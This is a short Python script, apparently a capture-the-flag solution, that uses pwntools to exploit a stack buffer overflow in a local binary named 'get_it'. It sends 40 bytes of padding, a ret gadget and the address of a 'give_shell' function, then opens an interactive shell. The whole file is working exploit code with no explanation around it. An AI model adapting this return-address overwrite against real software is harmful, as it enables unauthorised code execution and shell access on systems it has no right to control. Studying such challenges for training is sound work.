from pwn import *


elf = context.binary = ELF("./get_it")
p = process()

p.recvline()


OFFSET = b"A" * 40
payload = flat([
    OFFSET,
    0x0000000000400451,  # RET
    elf.sym["give_shell"]

])

p.sendline(payload)

p.interactive()